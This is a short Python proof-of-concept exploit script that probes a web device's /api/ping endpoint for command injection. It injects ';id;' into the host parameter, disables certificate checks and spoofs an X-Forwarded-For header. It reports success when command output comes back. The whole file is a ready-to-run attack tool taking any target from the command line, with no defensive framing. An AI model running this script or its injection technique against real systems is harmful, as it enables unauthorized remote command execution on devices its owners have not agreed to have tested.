import sys
import json
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def getres(target):
	headers={
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
	'Accept-Encoding': 'gzip, deflate',
	'X-Forwarded-For': '8.8.8.8',
	'Connection': 'close',
	'Upgrade-Insecure-Requests': '1',
	'Content-Type': 'application/x-www-form-urlencoded',
	}
	pat='service=(.*?)"'
	try:
		url=target+'/api/ping?count=5&host=;id;&port=80&source=1.1.1.1&type=icmp'
		res=requests.get(url=url,headers=headers,verify=False,timeout=3)
		if res.status_code == 200 and 'uid' in res.text:
			print(target,'--------->  success')
			print(json.loads(res.text)['result'])
	except Exception as e:
		pass

if __name__ == '__main__':
	try:
		target=sys.argv[1]
		if 'http' not in target:
			target='http://'+target
		getres(target)
	except Exception as e:
		print('python poc.py 目标')